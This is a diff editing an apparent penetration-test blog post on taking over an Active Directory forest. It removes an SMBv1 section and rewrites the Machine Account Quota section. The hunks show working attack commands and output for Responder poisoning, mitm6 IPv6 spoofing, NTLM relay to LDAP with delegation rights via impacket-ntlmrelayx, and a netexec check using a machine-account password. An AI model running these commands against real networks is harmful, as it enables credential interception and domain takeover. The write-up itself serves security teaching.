@@ -1,6 +1,6 @@
 ---
 title: "From Zero Creds to Enterprise Admin"
-date: "2025-05-14"
+date: "2025-05-20"
 tags: ["Active Directory", "Penetration Testing", "NTLM Relay", "SMB", "DCSync", "Domain Takeover", "Network Security"]
 ---
 
@@ -47,17 +47,6 @@ SMB         192.168.0.10       445    APP-SERVER01     [*] Windows Server 2022 B
 SMB         192.168.0.28       445    SQL-SERVER01     [*] Windows 10 / Server 2016 Build 14393 x64 (name:SQL-SERVER01) (domain:CORP.local) (signing:False) (SMBv1:False)
 ```
 
-### SMBv1 Enabled Systems
-
-While scanning for SMB signing issues, I also identified two systems still running the legacy SMBv1 protocol, which has been deprecated due to numerous security issues:
-
-```
-SMB         192.168.0.3        445    LEGACY-SERVER    [*] Windows 8.1 / Server 2012 R2 Build 9600 x32 (name:LEGACY-SERVER) (domain:LEGACY.LOCAL) (signing:False) (SMBv1:True)
-SMB         192.168.0.174      445    PRINTER-STORAGE  [*] EPSON Storage Server (name:PRINTER-STORAGE) (domain:PRINTER-STORAGE) (signing:False) (SMBv1:True)
-```
-
-These systems were particularly interesting as potential attack vectors due to their outdated configurations.
-
 ## Setting Up for MITM Attacks
 
 Given the SMB signing issues, the next logical step was to attempt network poisoning to intercept authentication traffic. This approach leverages how Windows systems attempt to resolve hostnames and authenticate to network resources.
@@ -70,9 +59,6 @@ I started Responder to listen for and respond to these broadcasts:
 
 ```bash
 sudo responder -I eth0 -wd
-```
-
-```
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -117,9 +103,7 @@ MITM6 spoofs IPv6 router advertisements and DNS responses, forcing Windows clien
 
 ```bash
 sudo mitm6 -d corp.local
-```
 
-```
 Starting mitm6 using the following configuration:
 Primary adapter: eth0 [00:0c:29:9a:b1:c2]
 IPv4 address: 192.168.0.3
@@ -179,9 +163,7 @@ sudo impacket-ntlmrelayx \
   -t ldap://dc-server01.corp.local:389 \
   --delegate-access \
   --no-smb-server
-```
 
-```
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Protocol Client HTTPS loaded..
@@ -369,9 +351,9 @@ The command completed successfully.
 
 This completed the attack chain - from having no credentials, I was able to obtain complete control over the Active Directory forest by exploiting a series of misconfigurations.
 
-## Additional Vulnerability: Machine Account Quota
+## Machine Account Quota: The Critical Misconfiguration
 
-During testing, I discovered another security issue: a high Machine Account Quota (MAQ) setting. This setting controls how many computer accounts a regular user can add to the domain:
+The crucial enabler for this attack chain was the default Machine Account Quota (MAQ) setting. This often-overlooked Active Directory configuration determines how many computer accounts a regular user can add to the domain.
 
 ```bash
 netexec ldap 192.168.0.206 -u 'ATTACKER-PC02$' -p 's0m3p455w0rd' -d corp.local -M maq
@@ -381,7 +363,11 @@ MAQ         192.168.0.206      389    DC-SERVER01      [*] Getting the MachineAc
 MAQ         192.168.0.206      389    DC-SERVER01      MachineAccountQuota: 10
 ```
 
-The default MAQ value is 10, but many security guidelines recommend reducing this to 0 to prevent authenticated users from creating computer accounts without administrative approval. A high MAQ value provides another attack vector for domain compromise, as it allows attackers to create computer accounts that can later be used in attacks like Resource-Based Constrained Delegation (RBCD).
+In this environment, the MAQ was set to the default value of 10, allowing any authenticated user to create up to 10 computer accounts. This default setting provided the foothold needed for our attack - without it, the NTLM relay wouldn't have been able to create the machine accounts that subsequently received DCSync privileges.
+
+Many organizations don't realize that this default setting effectively hands attackers the ability to establish persistence within the domain with minimal privileges. While Microsoft sets this default to simplify administration, most security standards recommend reducing it to 0, requiring explicit administrative approval for all computer account creations.
+
+The ability to add computer accounts in our relay attack opened the door for the next critical phase: escalating to DCSync privileges through ACL manipulation. 
 
 ## From Zero Access to Enterprise Admin: The Full Attack Path
 
